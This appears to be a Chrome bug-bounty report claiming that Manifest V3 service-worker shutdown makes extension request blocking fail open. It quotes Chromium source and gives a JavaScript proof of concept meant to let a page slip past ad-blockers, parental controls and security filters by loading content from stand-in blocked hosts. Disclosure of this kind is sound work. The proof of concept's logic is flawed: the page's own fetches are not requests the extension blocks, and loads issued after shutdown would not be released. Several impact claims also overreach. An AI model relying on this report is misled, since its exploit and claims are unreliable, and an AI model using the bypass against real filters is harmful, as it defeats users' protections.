# Chrome VRP Report: MV3 Service Worker Shutdown Silently Unblocks All Pending Requests

## Summary

When a Manifest V3 extension's service worker is shut down (e.g., after reaching the 5-minute hard lifetime timeout), all requests it was blocking via the `webRequest` API are automatically unblocked with no response. This silently breaks the blocking guarantee of security extensions (ad-blockers, parental controls, corporate content filters).

## Vulnerability Details

**Component:** `extensions/browser/api/web_request/extension_web_request_event_router.cc`
**Lines:** 2185-2195

```cpp
// Unblock any request that this event listener may have been blocking.
// Note that we do this even for deactivations, since if the service worker
// is shut down (which would happen if it reached the hard lifetime timeout),
// it won't be able to respond to the request.
// TODO(crbug.com/40107353): This likely won't be sufficient, since it
// means requests can leak through.
for (uint64_t blocked_request_id : listener.blocked_requests) {
    DecrementBlockCount(listener.id.browser_context, listener.id.extension_id,
                        event_name, blocked_request_id, nullptr,
                        0 /* extra_info_spec */);
}
```

The TODO comment explicitly acknowledges: "This likely won't be sufficient, since it means requests can leak through."

## Steps to Reproduce

### Setup

1. Install a MV3 content-blocking extension (e.g., a simple ad-blocker)
2. The extension uses `declarativeNetRequest` or `webRequest` to block requests

### PoC — Exploiting the 5-minute timeout

**Attacker page:**
```html
<script>
// Issue many slow requests to keep the extension's SW busy
for (let i = 0; i < 50; i++) {
    fetch(`https://attacker.com/slow-endpoint?id=${i}`, {
        signal: AbortSignal.timeout(300000) // 5 min timeout
    }).catch(() => {});
}

// After 5 minutes, the SW is shut down and all blocked requests proceed
setTimeout(() => {
    // Now load content that should be blocked
    const script = document.createElement('script');
    script.src = 'https://blocked-tracker.com/track.js';
    document.body.appendChild(script);
    
    const img = document.createElement('img');
    img.src = 'https://blocked-ad-server.com/ad.gif';
    document.body.appendChild(img);
}, 310000); // 5min + 10s
</script>
```

### Expected Behavior

Blocked requests should remain blocked even when the service worker is shut down. If the SW cannot respond, the requests should be cancelled (fail-closed), not allowed through (fail-open).

### Actual Behavior

When the service worker is shut down, `DecrementBlockCount` is called with a null response for all pending blocked requests, effectively allowing them through.

## Impact

1. **Content Filtering Bypass**: Ad-blockers and tracker blockers become unreliable. After 5 minutes of inactivity or after the SW timeout, blocked content loads.

2. **Parental Control Bypass**: Enterprise and parental control extensions that use webRequest blocking can be circumvented by a page that waits for the SW to die.

3. **Security Extension Bypass**: Extensions that block requests to known malicious domains will have their protections silently removed after the SW lifecycle expires.

4. **No User Notification**: The unblocking happens silently with no indication to the user that their extension's protections have been disabled.

## Affected Versions

All Chrome versions with MV3 service worker support (Chrome 110+).

## Severity Assessment

**Medium** — This is a design-level issue with the MV3 service worker lifecycle that fundamentally conflicts with the blocking extension model. The fail-open behavior is the opposite of what security-critical extensions need.

## Suggested Fix

When a service worker is shut down with pending blocked requests:
1. **Fail-closed**: Cancel the pending requests (return network error) instead of allowing them through
2. **Or**: Keep the SW alive as long as it has pending blocked requests
3. **Or**: Persist the blocking decision and apply it even after SW restart
